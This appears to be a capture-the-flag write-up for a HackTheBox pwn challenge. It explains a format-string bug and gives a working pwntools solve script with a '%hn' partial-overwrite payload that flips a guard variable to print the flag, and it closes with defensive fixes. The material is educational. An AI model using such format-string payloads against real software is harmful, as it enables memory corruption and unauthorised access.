---
title: "Space pirate: Entrypoint"
date: 2026-12-30 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, format-string, partial-overwrite, fsb]
description: "A Very Easy Pwn challenge on a fully-mitigated binary (PIE, Full RELRO, NX, stack canary). The bug is a classic format string — printf(buf) — but the win is gated by a stack variable equalling a magic value. Because the magic shares its high bytes with the variable's init value, a single two-byte %hn partial overwrite flips it, with no leak and no ASLR defeat."
---

## Overview

Space pirate: Entrypoint is a Very Easy [Pwn](https://app.hackthebox.com/challenges) challenge. The binary ships with every mitigation on — PIE, Full RELRO, NX, and a stack canary — so memory corruption is off the table. The flaw is a textbook [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html): the program prints your input *as a format string*, which gives us an arbitrary write via `%n`. The catch is the read is only 31 bytes, so we use a **partial overwrite** to flip just the bytes that differ.

## The technique

The program reads your "card serial number" into a stack buffer and then calls `printf(buf)` — passing user input directly as the format argument. After printing, `main` checks a local guard variable and only opens the door (which prints the flag) when it matches a magic constant:

```
[rbp-0x40] = 0xdeadbeef          ; init value of the guard
...
cmp [rbp-0x40], 0xdead1337        ; must equal the magic to win
jne  fail
call open_door                    ; system() -> prints the flag
```

Two details make this trivial:

1. **Only the low half differs.** `0xdead`**beef** and `0xdead`**1337** share their high 16 bits. A full four-byte `%n` write of `0xdead1337` would have to print ~3.7 billion characters (impossible in a 31-byte input) — but a two-byte `%hn` only needs to print `0x1337` = **4919** characters.
2. **A pointer to the guard is already on the stack.** The compiler emitted `lea rax,[rbp-0x40]; mov [rbp-0x38],rax`, and that pointer lands at `printf` positional argument `%7$`. We write *through* it, so we never need to know a stack address — PIE/ASLR is irrelevant.

## Solution

First, leak the argument layout to find which positions hold the guard, the pointer to it, and our buffer:

```
%6$p.%7$p.%8$p
   ->  0xdeadbeef . <stack ptr to guard> . <buffer bytes>
```

`%6$` is the guard's current value, `%7$` is the pointer to the guard, `%8$` is the buffer start. So the write target is `%7$`, and we need to write `0x1337` (4919) there.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys
from pwn import *
context.log_level = 'error'

host, port = sys.argv[1].split(':')
io = remote(host, int(port))

io.sendline(b'1')                    # menu choice that reaches printf(buf)
io.recvuntil(b'serial number:')
io.sendline(b'%4919c%7$hn')          # print 4919 chars, write 0x1337 through arg 7
io.recvuntil(b'open')
data = io.recvall(timeout=4).decode(errors='replace')
print(data)
import re
m = re.search(r'HTB\{[^}]*\}', data)
if m: print("FLAG:", m.group(0))
```

Run it against the instance:

```bash
python3 solve.py <target-host>:<target-port>
# ...
# [+] Door opened, you can proceed with the passphrase: HTB{...}
```

`%4919c` makes `printf`'s internal output counter reach 0x1337, then `%7$hn` writes that 16-bit counter to the guard's low half. The guard becomes `0xdead1337`, `open_door()` runs, and the flag is printed.

## Why it worked

`printf(buf)` lets the format string come from the attacker, so `%n`-family conversions turn a "print" into an arbitrary memory write ([CWE-134](https://cwe.mitre.org/data/definitions/134.html)). The author left a pointer to the very variable being checked sitting on the stack at a fixed `printf` argument index, and the magic value differed from the initial value only in its low two bytes — so a single tiny `%hn` partial overwrite was enough, defeating the check without leaking a single address.

## Fix / defense

- Never pass user input as a format string — use `printf("%s", buf)` with a literal format.
- Compile with `-Wformat -Werror=format-security` so the compiler rejects this at build time.
- `-D_FORTIFY_SOURCE=2` blocks `%n` in writable format strings at runtime.

The broader lesson: when a check compares a variable to a constant and the variable already shares most of its bytes with that constant, an attacker only needs to overwrite the *differing* bytes. Partial overwrites (`%hhn` / `%hn`) keep the write small enough to fit tight input limits and sidestep ASLR by reusing pointers the program already placed on the stack.
